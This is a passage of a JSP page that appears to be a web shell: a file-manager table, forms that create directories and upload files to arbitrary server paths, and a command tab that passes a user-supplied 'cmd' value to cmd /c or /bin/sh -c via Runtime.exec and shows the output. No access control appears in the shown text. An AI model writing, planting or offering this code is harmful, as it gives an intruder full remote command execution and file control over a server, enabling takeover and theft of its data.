									<span id="EditBox"><table width="100%" border="1"
											cellspacing="1" cellpadding="4" bordercolorlight="#cccccc"
											bordercolordark="#FFFFFF" bgcolor="white">
											<tr bgcolor="#E7e7e6">
												<td width="30%"><%=strFileName[languageNo]%><br>
													<br>
												</td>
												<td width="20%"><%=strFileSize[languageNo]%><br>
													<br>
												</td>
												<td width="25%"><%=strLastModified[languageNo]%><br>
													<br>
												</td>
												<td width="25%"><%=strFileOperation[languageNo]%><br>
													<br>
												</td>
											</tr>
											<%=sbFile%>
											<tr align="center">
												<td colspan="4">
													<br>
													file count:
													<font color="#FF0000"><%=filenum%></font> , size: <%=filelen%><br>
												</td>
											</tr>
										</table> </span>
									<%
										}
									%>

									<br>
									<br>
								</td>
							</tr>


							<tr>
								<td colspan=2 bgcolor=#FBFFC6>
									<form name="frmMake" action="" method="post"
										style="margin: 0px">
										<input type="hidden" name="action" value="newFile">
										<input type="hidden" name="path" value="<%=strDir%>">
										<input type="hidden" name="file" value="<%=strFile%>">
										<input type="hidden" name="cmd" value="<%=strCmd%>">
										<input type="hidden" name="tabID" value="1">
										<input type="hidden" name="content" value="">
										<%
											if (!strDir.endsWith(strSeparator))
												strDir = strDir + strSeparator;
										%>
										<input type="text" name="fileName" size=50 value="<%=strDir%>">
										<input type="submit" name="btnNewDir" value="Create Directory">
									</form>
									<form name="frmUpload" enctype="multipart/form-data" action=""
										method="post" style="margin: 0px">
										<input type="hidden" name="action" value="upload">
										<input type="hidden" name="path" value="<%=strDir%>">
										<input type="hidden" name="file" value="<%=strFile%>">
										<input type="hidden" name="cmd" value="<%=strCmd%>">
										<input type="hidden" name="tabID" value="1">
										<input type="hidden" name="content" value="">
										<input type="file" name="cqqUploadFile" size="50">
										<input type="submit" name="submit" value="upload">
									</form>
								</td>
							</tr>
						</table>
					</div>
					<div id="menu2" class="tabcontent">

						<%
							String line = "";
							StringBuffer sbCmd = new StringBuffer("");
							if (strCmd != null) {
								try {
									//out.println(strCmd);
									String[] strShell = new String[2];
									if (strOS.startsWith("win")) {
										strShell[0] = "cmd";
										strShell[1] = "/c";
									} else {
										strShell[0] = "/bin/sh";
										strShell[1] = "-c";
									}
									String[] strCommand = new String[3];
									strCommand[0] = strShell[0];
									strCommand[1] = strShell[1];
									strCommand[2] = strCmd;
									//System.out.println(strCommand);
									Process p = Runtime.getRuntime().exec(strCommand, null,
											new File(strDir));
									BufferedReader br = new BufferedReader(
											new InputStreamReader(p.getInputStream()));
									while ((line = br.readLine()) != null) {
										sbCmd.append(line + "\r\n");
									}
								} catch (Exception e) {
									System.out.println(e.toString());
								}
							} else {
								strCmd = "id";
							}
						%>
						<form name="cmd" action="" method="post">
							&nbsp;
							<input type="text" name="cmd" value="<%=strCmd%>" size=50>
							<input type="hidden" name="tabID" value="2">
							<input type="hidden" name="path" value="<%=strDir%>">
							<input type=submit name=submit
								value="<%=strExecute[languageNo]%>">
						</form>
						<%
							if (sbCmd != null && sbCmd.toString().trim().equals("") == false) {
						%>
						&nbsp;
						<TEXTAREA NAME="cqq" ROWS="20" COLS="100%"><%=sbCmd.toString()%></TEXTAREA>
						<br>
						&nbsp;
						<%
							}
						%>
						</DIV>
				</div>
				<br>
				<br>
				<style>
ul,li {
	list-style-type: none;
}

.voilet {
	width: 100%;
	background: #cdcdcd;
}

.voilet ul {
	text-align: center;
}

.voilet li {
	line-height: 25px;
}
</style>
